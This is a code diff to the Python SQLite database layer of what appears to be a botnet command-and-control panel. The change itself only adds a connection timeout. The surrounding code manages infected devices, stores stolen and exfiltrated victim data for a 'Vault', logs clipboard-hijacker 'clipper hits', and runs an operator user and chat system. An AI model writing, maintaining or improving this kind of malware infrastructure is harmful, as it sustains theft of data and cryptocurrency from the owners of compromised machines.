@@ -10,7 +10,7 @@ class Database:
         self._init_db()
 
     def _init_db(self):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.executescript("""
                 CREATE TABLE IF NOT EXISTS devices (
                     id TEXT PRIMARY KEY,
@@ -80,7 +80,7 @@ class Database:
     # ── Devices ───────────────────────────────────────────────────────────────
     def update_device(self, device_id: str, data: dict):
         """Atomically upserts device data and refreshes heartbeat timestamp."""
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "INSERT OR REPLACE INTO devices (id, data, last_seen) VALUES (?, ?, ?)",
                 (device_id, json.dumps(data), time.time())
@@ -89,14 +89,14 @@ class Database:
 
     def update_heartbeat(self, device_id: str):
         """Updates the last_seen timestamp only."""
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute("UPDATE devices SET last_seen = ? WHERE id = ?", (time.time(), device_id))
             conn.commit()
 
     def get_devices(self, user_role: str = "user", user_id: str = None) -> list:
         """Returns devices, filtering out private nodes for non-admins and unauthorized users."""
         devices = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute("SELECT id, data, last_seen FROM devices").fetchall():
                 dev_id, dev_data, last_seen = row
                 try:
@@ -118,7 +118,7 @@ class Database:
 
     def set_device_visibility(self, device_id: str, allowed_users: list = None):
         """Sets which users can see a node. None means public."""
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             row = conn.execute("SELECT data FROM devices WHERE id=?", (device_id,)).fetchone()
             if row:
                 data = json.loads(row[0])
@@ -131,13 +131,13 @@ class Database:
 
     def prune_stale(self, timeout=86400):
         """Removes device records older than `timeout` seconds."""
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute("DELETE FROM devices WHERE ? - last_seen > ?", (time.time(), timeout))
             conn.commit()
 
     # ── Stolen Data ───────────────────────────────────────────────────────────
     def add_stolen_data(self, device_id: str, data_type: str, data):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "INSERT INTO stolen_data (device_id, type, data, ts) VALUES (?, ?, ?, ?)",
                 (device_id, data_type, json.dumps(data), time.time())
@@ -146,7 +146,7 @@ class Database:
 
     def get_stolen_data(self, device_id: str) -> list:
         results = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute(
                 "SELECT type, data, ts FROM stolen_data WHERE device_id=? ORDER BY ts DESC",
                 (device_id,)
@@ -159,7 +159,7 @@ class Database:
     def get_all_stolen_data(self) -> list:
         """Retrieves all exfiltrated data across the entire botnet for the Vault."""
         results = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute(
                 "SELECT id, device_id, type, data, ts FROM stolen_data ORDER BY ts DESC"
             ).fetchall():
@@ -176,7 +176,7 @@ class Database:
 
     # ── Clipper Hits ──────────────────────────────────────────────────────────
     def log_clipper_hit(self, device_id: str, c_type: str, val: str):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "INSERT INTO clipper_hits (device_id, type, val, ts) VALUES (?, ?, ?, ?)",
                 (device_id, c_type, val, time.time())
@@ -185,12 +185,12 @@ class Database:
 
     # ── Config KV Store ───────────────────────────────────────────────────────
     def set_config(self, key: str, val: str):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute("INSERT OR REPLACE INTO config (key, val) VALUES (?, ?)", (key, val))
             conn.commit()
 
     def get_config(self, key: str) -> str | None:
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             row = conn.execute("SELECT val FROM config WHERE key=?", (key,)).fetchone()
         return row[0] if row else None
 
@@ -198,7 +198,7 @@ class Database:
     def upsert_user(self, provider: str, provider_id: str, username: str, ip: str, metadata: dict = None, hwid: str = None, ip_v6: str = None):
         user_id = f"{provider}:{provider_id}"
         meta_json = json.dumps(metadata) if metadata else None
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             # Check if HWID is banned first
             if hwid:
                 banned = conn.execute("SELECT id FROM users WHERE hwid=? AND is_banned=1", (hwid,)).fetchone()
@@ -232,7 +232,7 @@ class Database:
                 "ip": "0.0.0.0",
                 "metadata": {"avatar": "https://api.dicebear.com/7.x/avataaars/svg?seed=admin"}
             }
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             row = conn.execute("SELECT id, username, role, is_banned, last_ip, metadata FROM users WHERE id=?", (user_id,)).fetchone()
             if row:
                 meta = {}
@@ -243,7 +243,7 @@ class Database:
 
     def get_all_users(self):
         users = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute("SELECT id, username, role, is_banned, last_ip, last_active, metadata FROM users").fetchall():
                 meta = {}
                 try: meta = json.loads(row[6]) if row[6] else {}
@@ -256,7 +256,7 @@ class Database:
         return users
 
     def update_user_profile(self, user_id: str, username: str = None, role: str = None, is_banned: bool = None):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             if username:
                 conn.execute("UPDATE users SET username=? WHERE id=?", (username, user_id))
             if role:
@@ -267,7 +267,7 @@ class Database:
 
     # ── Chat ──────────────────────────────────────────────────────────────────
     def add_chat_message(self, user_id: str, username: str, message: str):
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "INSERT INTO chat_messages (user_id, username, message, ts) VALUES (?, ?, ?, ?)",
                 (user_id, username, message, time.time())
@@ -276,7 +276,7 @@ class Database:
 
     def get_chat_history(self, limit=50):
         messages = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute('''
                 SELECT c.rowid, c.username, c.message, c.ts, c.user_id, u.metadata 
                 FROM chat_messages c 
@@ -299,7 +299,7 @@ class Database:
                   target_id: str = None, ip: str = None, level: str = "info"):
         """Write a structured audit log entry."""
         import time
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "INSERT INTO audit_logs (ts, level, category, user_id, username, target_id, action, detail, ip) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
@@ -317,7 +317,7 @@ class Database:
         query += " ORDER BY ts DESC LIMIT ? OFFSET ?"
         params.extend([limit, offset])
         results = []
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             for row in conn.execute(query, params).fetchall():
                 results.append({
                     "id": row[0], "ts": row[1], "level": row[2], "category": row[3],
@@ -328,7 +328,7 @@ class Database:
 
     def prune_audit_logs(self, max_entries: int = 100000):
         """Keep only the most recent max_entries to prevent unbounded growth."""
-        with sqlite3.connect(self.db_path) as conn:
+        with sqlite3.connect(self.db_path, timeout=30) as conn:
             conn.execute(
                 "DELETE FROM audit_logs WHERE id NOT IN "
                 "(SELECT id FROM audit_logs ORDER BY ts DESC LIMIT ?)",
